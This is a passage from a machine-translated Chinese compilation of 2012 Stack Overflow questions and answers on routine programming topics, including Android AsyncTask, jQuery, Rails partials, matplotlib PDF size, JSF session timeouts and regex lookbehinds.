./configure CFLAGS="-D_XOPEN_SOURCE=600 -D_POSIX_C_SOURCE=200809L" 
```

希望它也对你有用。最初从这里得到答案[https://groups.google.com/forum/?fromgroups#!topic/comp.os.linux.development.apps/UiqFsaH69Aw](https://groups.google.com/forum/?fromgroups#!topic/comp.os.linux.development.apps/UiqFsaH69Aw)

--xkcdcode

# android - 如何在 onPostExecute 中确定活动现在没有暂停或销毁？

> ID：10685460
> 
> 赞同：2
> 
> 时间：2012-05-21T12:40:44.967
> 
> 标签：android, android-activity, android-asynctask

我启动`AsyncTask`并放入`Context`任务的构造函数。

在`onPostExecute`我想知道我的活动现在是否处于活动状态并且未被重新创建。怎么做比较好？

为此，我可以：

*   在Activity中创建randomNumber，`onCreate`然后放到`Application`class中；

*   onPause/onDestroy 将 randomNumber 设置为 0 并`onResume`恢复 randomNumber；

*   在`onPreExecute()`获取随机数`onPostExecute`并将随机数与应用程序随机数进行比较。

也许我可以使用 Context 来做出决定......？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:01:36.977

有很多方法可以检查活动是否仍然存在。

我通常创建一个`SkeletonActivity`具有以下结构的：

```
public class SkeletonActivity extends FragmentActivity {
    private boolean paused = false;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        paused = false;
    }
    @Override
    public void onPause() {
        super.onPause();
        paused = true;
    }
    @Override
    public void onResume() {
        super.onResume();
        paused = false;
    }
    @Override
    public void onStart() {
        super.onStart();
        paused = false;
    }
    public boolean isPaused() {
        return paused;
    }
} 
```

现在让你所有的活动扩展这个`SkeletonActivity`。最后更改此基类以根据需要更改暂停标志（例如在`onDestroy()`

* * *

另一种方法是在您的内部有一个 Context 实例`SkeletonActivity`：

```
public class SkeletonActivity extends FragmentActivity {
    private Context mContext;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        mContext = this;
    }
    @Override
    protected void onDestroy() {
        mContext = null;
        super.onDestroy();
    }
    public boolean isPaused() {
        return mContext==null;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:03:54.713

请看一下这个例子。我确实将上下文存储在 AsyncTask 中。在 onRetainNonConfigurationInstance() 期间，我将其设置为 null，在 onCreate() 期间，我将 Context 修补到当前正在运行的 Activity。您可以通过在 onDestroy() 中设置“task = null”来增强它：

```
public class MyActivity extends Activity {

    /* package */ MyActivity context;

    private class MyAsyncTask extends AsyncTask<Void, Void, Void> {

        public MyAsyncTask(final MyActivity context) {
            super();

            this.context = context;
        }

        @Override
        protected Cursor doInBackground(/* ... */) {
            // ...
        }

        @Override
        protected void onPostExecute(/* ... */) {
            if (context != null) {
                // ...
            }
        }

        @Override
        protected void onPreExecute (/* ... */) {
            // ...
        }
    }

    /* package */ MyAsyncTask task;

    @Override
    public void onCreate(final Bundle bundle) {
        // ...

        Bundle bundleExtras = getIntent().getExtras();
        if (bundleExtras != null) {
            task = (MyAsyncTask) getLastNonConfigurationInstance();
            if (task != null) {
                task.context = this;
                // ...
            } else {
                task = new MyAsyncTask(this);
                task.execute();
            }
        }
    }

    @Override
    public Object onRetainNonConfigurationInstance() {
        if (task != null) {
            // ...

            task.context = null;
        }

        return task;
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-11-28T11:52:59.630

这对其他人会很有帮助。

如果您按下主页按钮或返回按钮 onStop() 将被调用。所以在活动中声明一个变量，如

```
 boolean isActivityclosed=false; 
```

在 onStop() 方法期间将值设置为 true。

```
 @Override
    protected void onStop() {
        super.onStop();
        isActivityclosed=true;

    } 
```

现在，在 postExcecute 方法中检查变量是否为真。如果它是真的那么你的活动是在后台。

# javascript - 使用 jQuery 隐藏菜单

> ID：10685461
> 
> 赞同：1
> 
> 时间：2012-05-21T12:40:45.297
> 
> 标签：javascript, jquery, menu, navigation

我是 jQuery 新手，需要一点帮助。

我创建了一个导航菜单，一旦用户登陆页面，我希望在“3 秒”后完全向上消失。从这里，一个箭头将位于隐藏原始导航菜单的位置。

当用户单击“箭头”时，菜单将重新显示并在此处停留 20 秒。

我在这个 jsFiddle 中有一些代码，但它似乎没有做任何事情。有人可以帮忙吗？

[http://jsfiddle.net/headex/AsjMz/1/](http://jsfiddle.net/headex/AsjMz/1/)

传递的任何信息将不胜感激。

干杯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:48:43.497

您必须为 `<div/>`元素使用正确的选择器，并将`MenuOut()` 函数作为对象而不是字符串提供。

```
$(function() {
    setTimeout(MenuOut /*don't supply this parameter as a string*/, 3000); /* 3000 represent 3000 milliseconds, so 3 seconds */
});

function MenuOut() { /* The sample code I put on top */
    $('#nav'/*it's an id (#), here you have to use a string*/).slideUp();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T12:45:59.210

您的实时示例中的错误是您将函数的名称传递给 setTimeOut 函数，`""`换句话说

你有这个

```
 setTimeout("MenuOut", 3000); 
```

为此改变

```
 setTimeout(MenuOut, 3000); 
```

这是您使用该更改[Demo的实时示例](http://jsfiddle.net/AsjMz/5/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T12:47:27.450

而不是使用动画，看看使用jQuery的slideUp和slideDown。

你会想要像这样制作动画：`setTimeout("$('#nav').slideUp()", 3000);`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-21T12:51:19.860

你的 JS 有一些错误。setTimeout 需要函数回调，而不是字符串。您还使用了 $(nav) 而不是 $("#nav")

[http://jsfiddle.net/AsjMz/9/](http://jsfiddle.net/AsjMz/9/)

# ruby-on-rails - 在 rails 3.1 中使用 ajax 调用渲染部分视图

> ID：10685462
> 
> 赞同：3
> 
> 时间：2012-05-21T12:40:48.017
> 
> 标签：ruby-on-rails, ajax, ruby-on-rails-3.1, erb, renderpartial

我现在从 Rails 开始，我认为我有一个简单的问题。我需要在一个 ajax 调用中渲染两个部分：

我有以下控制器：

```
# GET /hosts/1
# GET /hosts/1.json
def show
   @host = Host.find(params[:id])

   respond_to do |format|
      format.html #show.html
      format.js
      format.json { render :json => @host }
   end
end 
```

以及相应的模板（show.js.erb）：

```
$('#tabs-1').html("<%= escape_javascript(render @host) %>"); 
```

还有一个名为 _host.html.erb 的部分文件

这一切都很好。模板“_host.html.erb”在 div tabs-1 中呈现，但现在我需要在不同的 id (#tabs-2) 中添加一些其他部分模板，但使用相同的 @host 我该怎么做？默认情况下，render @host 方法将使用模板文件“_host.html.erb”。我怎样才能调用另一个像 _host2.html.erb 并拥有相同的 @host 实例可用？

谢谢，若奥

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-21T13:02:57.750

```
$('#tabs-1').html("<%= j(render @host) %>");
$('#tabs-2').html("<%= j(render :partial => 'host2', :locals => { :host => @host }) %>"); 
```

# javascript - 错误：无法校准 null {ExtJs4} 的方法“addCls”

> ID：10685463
> 
> 赞同：0
> 
> 时间：2012-05-21T12:40:48.437
> 
> 标签：javascript, extjs4

我正在为我的项目使用[Bryntum](http://www.sencha.com)[图表](http://bryntum.com)和extjs4。这是我从昨天开始得到的错误![从 chrome 的调试控制台捕捉](../Images/f4f6d3610d296be2176d23143d4754ab.png)

我知道方法 addCls 没有定义。

如何解决这个错误。

我的代码文件非常大，大约 1500 行，但如果需要理解问题，那么我也会粘贴整个代码......

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T22:32:48.197

在引发异常的行上放置一个断点。找出哪个对象（罪魁祸首）正在尝试调用 addCls() 方法，然后编辑断点以添加如下条件：

罪魁祸首 == 未定义

下次代码将在您遇到错误之前停止。然后，您可以检查堆栈并查看此时的调用层次结构。

# ruby-on-rails - Rails、Cucumber、Capybara、Selenium、Pow、域、子域和 javascript

> ID：10685465
> 
> 赞同：5
> 
> 时间：2012-05-21T12:40:58.727
> 
> 标签：ruby-on-rails, selenium, cucumber, subdomain

TL:DR - 如何让 Cucumber 通过应用程序请求页面，但假装请求来自“http://mysubdomain.mydomain.dev”，并正确运行 javascript？

好的，这可能需要一些时间来解释，但请多多包涵……

我是一个“相对”经验丰富的 Rails 开发人员，但直到最近才开始涉足完整的 BDD/TDD。

我在 cucumber 中测试的页面中有一些 javascript 用于创建一个新的嵌套对象（非常类似于这个[RailsCast](http://railscasts.com/episodes/196-nested-model-form-revised)）。

现在的问题在于，我不仅有可变的子域，我也有可变的*域*（只要相信我……）

因此，应用程序需要在后台查询所有内容`request.host`以找到`current_domain`和之前，它可以继续为应用程序的正确位提供服务。`current_subdomain`

我已经设法在后台步骤中使用`host! domain`和技术让所有测试顺利通过。`Capybara.default_host = domain`

但是，当我在测试带有 .js 的页面的功能上使用 @javascript 标记时，我让 Firefox 抓住焦点，然后尝试加载完整的 url。

现在，我也正在运行 Pow，并将这些 url 连接到开发服务器。不出所料，当用户尝试登录时，它们不起作用，它正在查看开发数据库。我在关闭 pow 服务器后尝试运行该套件，但它只是超时了。

当然，javascript webdriver 不应该实际访问 url，而只是运行应用程序本身并假装主机是我告诉它的？

我显然在这里遗漏了一些东西 - 我怎样才能让 Cucumber 在内部构建页面，但假装请求来自“http://mysubdomain.mydomain.dev”？

**编辑：** *Jason* - 可变域技巧的实现与子域完全相同...如果您可以基于 查询 db 的帐户`request.subdomains.first`，则可以通过`request.domain`. 你只需要仔细检查一些东西，比如大小写等，以尽量减少格式错误的 url 破坏东西的风险，显然你需要首先确保域记录存在于数据库中......

哦 - 并小心缓存域记录请求......

这意味着您可以提供相同的应用程序，但具有不同的样式和登录页面等。对于拥有广泛客户群的 PaaS 应用程序很有用 - 您可以重新命名它并将其作为针对某一组问题的特定解决方案出售，即使它是下面同样的胆量。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-21T23:12:13.327

我想做一些非常相似的事情。我考虑添加一个额外的 pow 目录进行测试，然后使用 pow 指令覆盖环境。我认为这是在您的应用程序目录中的“.powenv”中完成的。这是一个快速修复的示例：

```
echo export RAILS_ENV=cucumber > .powenv && touch tmp/restart.txt 
```

但是最好做一些动态的事情，这样在开始测试之前，您可以告诉 pow 要运行什么环境，然后在完成切换后，甚至可以在不同的端口上临时运行测试服务器。Pow 是迄今为止我所知道的处理子域的唯一出色解决方案。

**已编辑：**我现在在我的环境中使用此功能，并在我的***features/support/env.rb***文件中添加了以下内容。

```
# Switch Pow to For Cucumber Tests
Capybara.default_driver = :selenium # Subdomain testing will only work with pow and selenium
pow_config = "#{Rails.root}/.powenv" # Dont change, this is the Config Files Location.
pow_config_stash = "#{Rails.root}/.powenv_original" # This is what the config will be stashed as during testing.

Before do

  # Set the default host
  Capybara.app_host = "http://www.resipsa.dev"

  # Stash the existing config
  File.rename(pow_config,pow_config_stash) if File.exists? pow_config

  # Write the new pow config
  f = File.new("#{Rails.root}/.powenv", "w")
  f.write "export RAILS_ENV=test"
  f.close

  # Touch tmp/restart.txt to force a restart
  FileUtils.touch "#{Rails.root}/tmp/restart.txt"

end

After do

  # Delete the temp config
  File.delete(pow_config)

  # Restore the Original Config
  File.rename(pow_config_stash,pow_config) if File.exists? pow_config_stash

  # Touch tmp/restart.txt to force a restart
  FileUtils.touch "#{Rails.root}/tmp/restart.txt"

end 
```

# android - Android 资源“最佳匹配”回退逻辑

> ID：10685466
> 
> 赞同：2
> 
> 时间：2012-05-21T12:41:01.037
> 
> 标签：android, drawable, directory-structure, android-resources

我已经阅读了有关[Android 资源](http://developer.android.com/guide/topics/resources/providing-resources.html#BestMatch)的文档，并且我想我已经理解了 android 用来识别应该首先在哪个目录中搜索特定资源的最佳匹配逻辑。假设*drawable-hdpi*、*drawable-en-port*和drawable-en* 匹配当前设备配置，*drawable-en-port*是最佳匹配目录。我的问题是，如果在*drawable-en-port*中没有找到 drawable ，系统是直接在*drawable*中查找还是看起来在第二个最佳匹配*drawable-en*中，然后在第三个最佳匹配*drawable-hdpi*中，依此类推，直到达到*drawable*? 我想它是这样工作的，但我没有发现它在文档中明确说明（除非我读得太快，你肯定会杀了我:)）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:49:07.117

是的，它首先出现在`drawable-en`, 然后`drawable-hdpi`因为语言限定符具有更高的优先级。如果仍未找到值，`drawable`则搜索目录。它符合： [Android 如何找到最佳匹配资源](http://developer.android.com/guide/topics/resources/providing-resources.html#BestMatch)

如果`drawable-en`包含匹配资源`drawable-hdpi`，`drawable`则将根据算法的步骤 4 将其消除。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T12:49:51.173

我读了介绍部分

```
assume the following drawable directories each contain different versions of the same images 
```

在您的示例中，Android 将忽略 drawable-en-port 文件夹，因为其中没有该可绘制名称。它只会查看具有该可绘制对象的文件夹，因此会选择最匹配的文件夹。如果没有具有匹配配置和图像的文件夹，它只会选择“可绘制”。

# html - 我的页面底部和右侧的空间

> ID：10685467
> 
> 赞同：1
> 
> 时间：2012-05-21T12:41:02.250
> 
> 标签：html, css, space

这是页面：[propertytest.uphero.com](http://propertytest.uphero.com)

我已将问题缩小到 6 个蓝色框（前 3 个位于名为 offer 的 div 下，下面的 3 个位于名为 properties 的 div 下）。如果我要把它们拿出来，空间就会消失，但我真的很想把它们留在里面，所以我需要有人帮我解决它，这样我就可以保留盒子并且在页脚下方没有空间。

我认为我的问题在于它们是相对定位的（所有 div 都是相对定位的——我现在意识到这一点是个坏主意）。

我努力了：

*   将 2 个 div 与绝对定位对齐 - 这样可以消除底部/右侧的空间，但是如果我要缩小浏览器，这些框就会错位..

*   删除所有定位并将它们浮动到左/右 - 删除底部/右侧的空间，但不会进入我希望它们的位置（我不认为你可以定位浮动顶部/底部/左侧/右边还是边距？）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:01:45.797

以下是如何整理您当前拥有的 6 个框作为 position:relative;

[http://jsfiddle.net/F9Q6T/](http://jsfiddle.net/F9Q6T/)

基本前提是您将盒子漂浮在容器内，然后清除它们以使容器大小合适。

对于页面底部的问题，您需要删除底部：290px；从你的页脚。这似乎是导致问题的原因

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:34:47.983

我认为主要问题是`body background image. You have used image of 1300px * 1000px size`。我认为你必须使用`image of 1px width with repeat property.`. 底部的空白是由于`bottom`订单和属性 div 的属性

谢谢。

# wordpress - wordpress 如何使用一个数据库管理网站和移动网站

> ID：10685468
> 
> 赞同：-1
> 
> 时间：2012-05-21T12:41:08.047
> 
> 标签：wordpress, mobile

我想在 wordpress 中建立一个网站。像 mysite.com 这样的网络版本和像 m.mysite.com 这样的移动版本。我认为它可以在 wordpress 中实现，因为 wordpress 将域名保存在数据库中。

mysite.com/m 将是可能的，但要求是与 m.mysite.com 一起使用。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:45:44.377

这方面的方法帮助了我：[http ://www.phillipadsmith.com/2011/11/note-to-self-a-simple-way-to-accomplish-mobile-site-redirection-using-mod-rewrite.html](http://www.phillipadsmith.com/2011/11/note-to-self-a-simple-way-to-accomplish-mobile-site-redirection-using-mod-rewrite.html)

但是，正确创建模板和 css 确实会使需求变得多余。

# asp.net - 搜索引擎优化：像黄页这样的网站如何获得搜索引擎找到的所有列表

> ID：10685478
> 
> 赞同：-1
> 
> 时间：2012-05-21T12:42:00.700
> 
> 标签：asp.net, seo, sql-server-2008-r2

我正在尝试建立一个本地餐厅列表/评论网站。我不禁注意到，如果我在 Web 上搜索餐厅，黄页或 Yelp 等网站的列表顶部会显示该餐厅的列表。显然，他们没有为美国的每家餐厅提供单独的网页，但不知何故，他们的信息数据库正在被搜索引擎读取。这是如何实现的？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T12:47:53.940

信息存储在数据库中，模板页面只是从数据库中提取信息并显示出来。通过巧妙地使用 URL 重写或在 .NET 中使用[路由](http://msdn.microsoft.com/en-us/library/cc668201.aspx)，该 URL*似乎*是餐厅的唯一页面。

路由基本上从 url 中获取一个 GET 参数，将其作为伪路径合并到 URL 中，然后使用该参数获取数据库记录以显示餐厅。

# visual-c++ - Visual c++ 图片框的 ScreenToClient 函数

> ID：10685481
> 
> 赞同：0
> 
> 时间：2012-05-21T12:42:21.570
> 
> 标签：visual-c++, picturebox

我想在图片框中获取鼠标的坐标。我使用了 ScreenToClient，但我遇到了一些问题。

```
 HWND hwnd;
            hwnd = pictureBox1->Handle;
            ScreenToClient(hwnd,&point); 
```

其中 point 具有鼠标的绝对坐标。对于代码的第二行，我得到的错误是“无法从 'System::IntPtr' 转换为 'HWND'”。我如何获得图片框的手柄？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T12:55:38.673

```
hwnd = (HWND)pictureBox1->Handle.ToPointer();

```

顺便说一句，最好保持这段代码纯托管，使用 Control.PointToClient 和 Control.PointToScreen 方法在屏幕和客户端坐标之间进行转换。

# objective-c - 使用字符串化创建 Objective-C 字符串

> ID：10685486
> 
> 赞同：3
> 
> 时间：2012-05-21T12:42:56.260
> 
> 标签：objective-c

我正在尝试使用“#”和“##”运算符创建一个 Objective-C 字符串。我写了以下宏：

```
#define OBJCKEY(p, s) p ## s
#define KEY(k) OBJCKEY(@, #k) 
```

我试图通过以下方式在函数中使用它：

```
NSString *key = KEY(EnumValue1); 
```

但是Xcode报如下错误：

```
Pasting formed '@"EnumValue1"', an invalid preprocessing token 
```

关于如何解决这个问题的任何想法？

注意：我使用的是 LLVM 编译器。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-21T12:56:49.490

> 关于如何解决这个问题的任何想法？

有什么问题吗

```
NSString* key = @"EnumValue1"; 
```

或者怎么样

```
#define KEY(k) (@#k)

NSString* key = KEY(EnumValue1); 
```

# session - 设置用户可以登录的最长时间，无论他们的活动如何

> ID：10685488
> 
> 赞同：0
> 
> 时间：2012-05-21T12:43:07.837
> 
> 标签：session, jsf-2, time, max

我正在为具有持续交付的系统开发蓝绿色模式。我想强制用户在 30 分钟后切换服务器。我正在 JSF 2 中开发我的应用程序。无论用户是否处于活动状态，是否有一种简单的方法可以让会话在一段时间后结束？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-21T13:16:12.087

实现一个[过滤器](https://stackoverflow.com/tags/servlet-filters/info)，它基本上完成以下工作：

```
HttpSession session = request.getSession();

if (session.isNew()) {
    session.setAttribute("start", System.currentTimeMillis());
}
else {
    long start = (Long) session.getAttribute("start");

    if (System.currentTimeMillis() - start > (30 * 60 * 1000)) {
        session.invalidate();
        response.sendRedirect("expired.xhtml");
        return;
    }
}

chain.doFilter(request, response); 
```

将此映射到感兴趣的 servlet 名称或 URL 模式。

这仅对系统时钟的变化敏感，请确保您的服务器始终运行 UTC。否则最好抓住`System#nanoTime()`。

# dpi - 减少matplotlib中pdf图形文件的大小

> ID：10685495
> 
> 赞同：10
> 
> 时间：2012-05-21T12:43:27.667
> 
> 标签：dpi, matplotlib, figure

在`matplotlib`中，我`LineCollection`用来绘制国家并为其着色，其中给出了县的边界。当我将图形保存为 pdf 文件时：

```
fig.savefig('filename.pdf',dpi=300) 
```

图形尺寸相当大。但是，将它们保存为 png 文件：

```
fig.savefig('filename.png',dpi=300) 
```

然后使用linux`convert`命令将它们转换为pdf文件很小。我尝试降低 dpi，但是不会改变 pdf 文件的大小。有没有办法可以将这些数字直接保存为 matplotlib 中的较小的 pdf 文件？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-05-21T13:27:23.150

PDF 更大，因为它包含所有矢量信息。通过保存 PNG，您可以生成光栅化图像。在您的情况下，您似乎可以通过直接栅格化绘图来生成较小的 PDF：

```
plt.plot(x, y, 'r-', rasterized=True) 
```

这`x, y`是一些绘图坐标。您基本上必须使用附加关键字参数`raterized`才能达到效果。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-02-16T20:22:47.807

我认为使用“rasterized = True”可以有效地保存图像，类似于 png 格式。放大时，您会看到模糊的像素。

如果您希望这些数字具有高质量，我的建议是从数据中采样并绘制图表。pdf 文件大小大致是它需要记住的数据点的数量。

# android - Android - 获取音量按钮长按

> ID：10685502
> 
> 赞同：0
> 
> 时间：2012-05-21T12:43:40.807
> 
> 标签：android, click, touch, hardware, wait

有人可以给我看一个关于如何在音量增大硬件键上长按（例如 2 秒）的代码示例吗？

谢谢 ：）

**编辑**

我想捕捉长按的类是服务。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T12:50:25.073

如果您只需要捕获长点击，这个答案可能会有所帮助：

[https://stackoverflow.com/a/5269673/1401257](https://stackoverflow.com/a/5269673/1401257)

**编辑：**

我从来没有尝试过在服务中设置一个关键监听器，但是在谷歌的帮助下我发现了这个：[音量变化监听器？](https://stackoverflow.com/questions/7130455/volume-change-listener)

似乎只能从活动中处理正常的关键事件。我没有时间自己尝试这个，但是为了捕捉长时间的点击，可以将链接中的答案和卢克斯的答案结合起来。根据我对广播接收器的了解，您可能希望创建一个接收器，每当有人单击音量按钮时通知服务。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-21T13:07:13.090

或者，您可以执行以下操作：

```
if(clickedDown) {
if(beginningTime + 2000 < System.currentTimeMillis()) {
// Ok, the button has been clicked down for 2 seconds
}
}
else {
beginningTime = System.currentTimeMillis();
} 
```

应用这样的东西，您将能够定义等待的时间量。

# debugging - 在 CoffeeScript 中使用 Backbone-relational

> ID：10685504
> 
> 赞同：4
> 
> 时间：2012-05-21T12:43:41.880
> 
> 标签：debugging, scope, coffeescript, backbone-relational

我正在尝试在项目中使用 Backbone-relational 和 CoffeeScript。以下是 CoffeeScript 中我要建模的事物类型的示例：

```
 class NestedModel extends Backbone.RelationalModel
    defaults:
     Description: 'A nested model'

  NestedModel.setup()

  class MainModel extends Backbone.RelationalModel
    defaults:
     Description: 'A MainModel description'
     StartDate: null

    relations: [
      type: Backbone.HasOne
      key:  'nestedmodel'
      relatedModel: 'NestedModel'
      includeInJSON: '_id'
      reverseRelation:
        type: Backbone.HasOne
        includeInJSON: '_id'
        key: 'mainmodel'   
    ]

  MainModel.setup()     

  nm = new NestedModel()
  mm = new MainModel(nestedmodel: nm)
  console.log mm.get("nestedmodel").get("mainmodel").get("Description")
  return 
```

CoffeeScript 生成以下 JavaScript：

```
 var MainModel, NestedModel, mm, nm;
  var __hasProp = Object.prototype.hasOwnProperty, __extends = function(child, parent) {
    for (var key in parent) { if (__hasProp.call(parent, key)) child[key] = parent[key]; }
    function ctor() { this.constructor = child; }
    ctor.prototype = parent.prototype;
    child.prototype = new ctor;
    child.__super__ = parent.prototype;
    return child;
  };
  NestedModel = (function() {
    __extends(NestedModel, Backbone.RelationalModel);
    function NestedModel() {
      NestedModel.__super__.constructor.apply(this, arguments);
    }
    NestedModel.prototype.defaults = {
      Description: 'A nested model'
    };
    return NestedModel;
  })();
  NestedModel.setup();
  MainModel = (function() {
    __extends(MainModel, Backbone.RelationalModel);
    function MainModel() {
      MainModel.__super__.constructor.apply(this, arguments);
    }
    MainModel.prototype.defaults = {
      Description: 'A MainModel description',
      StartDate: null
    };
    MainModel.prototype.relations = [
      {
        type: Backbone.HasOne,
        key: 'nestedmodel',
        relatedModel: 'NestedModel',
        includeInJSON: '_id',
        reverseRelation: {
          type: Backbone.HasOne,
          includeInJSON: '_id',
          key: 'mainmodel'
        }
      }
    ];
    return MainModel;
  })();
  MainModel.setup();
  nm = new NestedModel();
  mm = new MainModel({
    nestedmodel: nm
  });
  console.log(mm.get("nestedmodel").get("mainmodel").get("Description"));
  return; 
```

这会产生以下警告和错误

```
Warning:
Relation= child
; no model, key or relatedModel (function MainModel() {
              MainModel.__super__.constructor.apply(this, arguments);
            }, "nestedmodel", undefined)

Error:
Uncaught TypeError: Cannot call method 'get' of undefined 
```

只需从生成的 JavaScript 的第一行中删除“NestedModel”变量

```
var MainModel, NestedModel, mm, nm; 
```

导致正确的行为。显然我不能一直从生成的 JavaScript 中删除变量定义。我究竟做错了什么？

好的，这似乎是一个范围界定问题。请参阅以下[jsFiddle 示例](http://jsfiddle.net/simax/nvm6H/3/)。但是为什么我不能只引用本地函数范围内的类呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-12-02T19:29:17.247

> 但是为什么我不能只引用本地函数范围内的类呢？

类被实现为立即调用的函数表达式

> 理解诸如立即调用函数表达式之类的设计模式的关键是要意识到 JavaScript 具有函数作用域（而不是块作用域）并在闭包内通过引用传递值。

**参考**

*   [立即调用的函数表达式](http://en.m.wikipedia.org/wiki/Immediately-invoked_function_expression)

# regex - 正则表达式查找字符串是否在另一个字符串之后

> ID：10685507
> 
> 赞同：0
> 
> 时间：2012-05-21T12:43:59.493
> 
> 标签：regex, preg-match, preg-match-all

谁能帮我找到以下的正则表达式。我试图匹配“已处理”之后的数字，但前提是前一行包含字符串“支持”。

我一直在使用 "(?<=Processed )(.*?)(?= bytes)" 来获取号码，但我想使用 preg-match-all 并且只匹配备份的号码，而不是验证的号码……

这是一个示例字符串：

```
Backed up 77914 files in 16615 directories.  
Processed 19,500,663,915 bytes in  10 minutes and  27 seconds.  
Throughput rate: 1780 MB/min*  

Contents verified.  
Processed 13,694,118,197 bytes in  1 minute and  41 seconds.  
Throughput rate: 7758 MB/min* 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T13:24:21.487

试试这个

```
(?<=.*Backed.*)[\d,]+(?= bytes) 
```

给定输入

```
Backed up 77914 files in 16615 directories. Processed 19,500,663,915 bytes in 10 minutes and 27 seconds. Throughput rate: 1780 MB/min
Contents verified. Processed 13,694,118,197 bytes in 1 minute and 41 seconds. Throughput rate: 7758 MB/min
Backed up 77914 files in 16615 directories. Processed 19,500,663,915 bytes in 10 minutes and 27 seconds. Throughput rate: 1780 MB/min
Contents verified. Processed 13,694,118,197 bytes in 1 minute and 41 seconds. Throughput rate: 7758 MB/min 
```

它会匹配

```
19,500,663,915
19,500,663,915 
```

可能是 PCRE 库不支持后向无限重复。如果是这样，我们可以寻找替代方案

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T13:07:30.357

这是根据您的要求我能得到的最接近的：

```
(?<=Backed)[^\n]+[\n\r]+.*Processed\s(?<num>(\d+\,*)+)\sbytes 
```

结果在组中`num`

我已经使用以下输入对其进行了测试：

> 在 16615 个目录中备份了 77914 个文件。在 10 分 27 秒内处理了 19,500,663,915 个字节。吞吐率：1780 MB/分钟
> 
> 内容已核实。在 1 分 41 秒内处理了 13,694,118,197 个字节。吞吐率：7758 MB/分钟
> 
> 16615 个目录中的 77914 个文件。在 10 分 27 秒内处理了 19,500,663,915 个字节。吞吐率：1780 MB/分钟
> 
> 内容已核实。在 1 分 41 秒内处理了 13,694,118,197 个字节。吞吐率：7758 MB/分钟

..它只匹配第一次出现的 13,694,118,197

# header - CSS：动态最小高度取决于分辨率

> ID：10685508
> 
> 赞同：1
> 
> 时间：2012-05-21T12:44:05.400
> 
> 标签：header, footer, css

是否可以计算css文件中两个div之间的差异？目标是将内容 div 的高度设置为固定页眉和页脚之间给出的最大高度。例如，我们有一个高度为 25% 的页眉 div 和一个高度为 15% 的页脚，两者都是固定的。内容之间的空间应始终完全填满。因此，由于差距会根据客户端显示器上设置的分辨率而变化，我需要类似的东西：

min-height = browserheight - (headerheight + footerheight)

太长...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T15:11:16.370

这在纯 CSS 中是不可能的。但是你可以试试 LESS/SASS。它是类 css 的语言，可以编译为纯 css。

[http://lesscss.org/](http://lesscss.org/)

```
@containerWidth : 1000px;
@contentWidth   : 800px;

.side {
   width : @containerWidth-@contentWidth;
} 
```

但是对于从浏览器获得的值来说，它会更加困难。

例如浏览器宽度或浏览器高度。您可以通过执行一些 javascript 在 LESS 中获取此值（在 LESS 中是可能的）。但是，只有当您附加 .less 文件作为您的样式并在`<script>`标签中使用 javascript 编译器时，您的样式才会起作用，当页面加载时，它会从您的较少样式 - css 样式中生成。但它很慢。

使用 LESS 的更好方法是编辑 .less 文件中的代码，将其编译为 .css 并在网站上插入纯 css 样式。但是，如果您在服务器端编译样式，则无法获得浏览器的高度或宽度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-21T20:38:30.790

CSS 当前不支持计算值。

管道中有一些实验性的新 CSS 功能可以做到这一点，这些功能目前正在通过标准化过程并刚刚开始出现在 Chrome、Firefox 等的 beta 版本中。你现在可以开始尝试它，但是它需要很长时间才能获得足够的真实世界浏览器支持，您可以将其用于真实站点。

同时，如果您想了解有关 CSS Calc() 功能的更多信息，请查看[Mozilla 开发者网站](https://developer.mozilla.org/en/CSS/-moz-calc)。

旧版本的 Internet Explorer 有一个名为 的功能`CSS Expressions`，在概念上也非常相似。但是，它从未标准化，也不再受支持。

所以就今天的情况而言，标准 CSS 不支持这种事情。

替代方法是使用 CSS 预处理器，例如[LESS](http://lesscss.org/)或[SASS](http://sass-lang.com/)。在没有纯 CSS 解决方案的情况下，这两个程序都试图用类似编程的特性来扩展 CSS 语法。您使用 SASS 或 LESS 语法编写 CSS，然后将其转换为标准 CSS，然后再将其上传到您的站点。

这些可能会为您提供您正在寻找的东西，尽管最终结果仍然是标准 CSS，您仍然无法使用它们进行动态计算。

希望有帮助。

# javascript - 确定要放置在固定图层中的图像数量

> ID：10685511
> 
> 赞同：0
> 
> 时间：2012-05-21T12:44:17.617
> 
> 标签：javascript

正如标题所解释的那样。

我需要确定可以在 div 中放置的图像集合中的图像数量，例如 100px x 100px 以及每个图像的宽度和高度。

我一直在尝试为此找出算法，但我的大脑被炸了。

